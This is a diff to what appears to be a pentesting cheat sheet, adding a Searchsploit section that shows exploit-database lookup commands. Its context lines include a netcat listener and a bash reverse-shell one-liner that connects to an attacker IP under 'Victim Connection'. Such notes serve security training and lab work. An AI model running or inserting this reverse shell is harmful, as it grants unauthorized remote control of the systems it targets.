@@ -27,6 +27,7 @@
 * [Dumb Shell to Fully Interactive Shell](#dumb-shell-to-fully-interactive-shell)
 * [Webshell](#Webshell)
 * [ReverseShell](#ReverseShell)
+* [Searchsploit](#Searchsploit)
 
 # Enumeration
 
@@ -599,5 +600,13 @@ nc -nvlp 4444
 ## Victim Connection
 ~~~ shell
 bash -c "bash -i >& /dev/tcp/192.168.119.3/4444 0>&1"
+~~~
+
+
+# Searchsploit
+
+~~~ bash
+searchsploit [keyword]
+searchsploit -p [EDB-ID]
 ~~~
 
